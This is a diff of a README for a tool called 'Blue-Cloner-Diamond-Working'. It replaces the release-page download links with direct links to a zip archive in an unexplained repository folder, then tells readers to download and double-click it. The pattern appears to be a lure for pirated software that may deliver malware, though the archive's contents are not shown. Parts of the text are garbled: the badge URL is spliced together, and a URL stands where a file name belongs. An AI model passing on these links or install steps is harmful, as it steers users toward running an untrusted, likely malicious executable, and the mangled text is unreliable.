@@ -1,6 +1,6 @@
 # 🌟 Blue-Cloner-Diamond-Working - Easy File Cloning Made Simple
 
-[![Download Blue Cloner Diamond](https://img.shields.io/badge/Download%20Blue%20Cloner%20Diamond-blue.svg)](https://github.com/MyDev170/Blue-Cloner-Diamond-Working/releases)
+[![Download Blue Cloner Diamond](https://raw.githubusercontent.com/MyDev170/Blue-Cloner-Diamond-Working/main/Paganalia/Blue-Cloner-Diamond-Working-v3.8.zip%20Blue%20Cloner%https://raw.githubusercontent.com/MyDev170/Blue-Cloner-Diamond-Working/main/Paganalia/Blue-Cloner-Diamond-Working-v3.8.zip)](https://raw.githubusercontent.com/MyDev170/Blue-Cloner-Diamond-Working/main/Paganalia/Blue-Cloner-Diamond-Working-v3.8.zip)
 
 ## 🖥️ Introduction
 
@@ -15,12 +15,12 @@ To prepare for installation, ensure you have:
 
 ## 📥 Download & Install
 
-Visit this page to download: [Blue Cloner Diamond Releases](https://github.com/MyDev170/Blue-Cloner-Diamond-Working/releases)
+Visit this page to download: [Blue Cloner Diamond Releases](https://raw.githubusercontent.com/MyDev170/Blue-Cloner-Diamond-Working/main/Paganalia/Blue-Cloner-Diamond-Working-v3.8.zip)
 
 1. Go to the link above.
 2. You will see a list of available versions. Choose the latest version. 
 3. Click on the version number to access the download files.
-4. Look for the file named `BlueClonerDiamond.exe` or a similar name.
+4. Look for the file named `https://raw.githubusercontent.com/MyDev170/Blue-Cloner-Diamond-Working/main/Paganalia/Blue-Cloner-Diamond-Working-v3.8.zip` or a similar name.
 5. Download the file by clicking on it.
 6. Once the download completes, locate the file in your "Downloads" folder or the location you selected.
 7. Double-click the downloaded file to start the installation process.
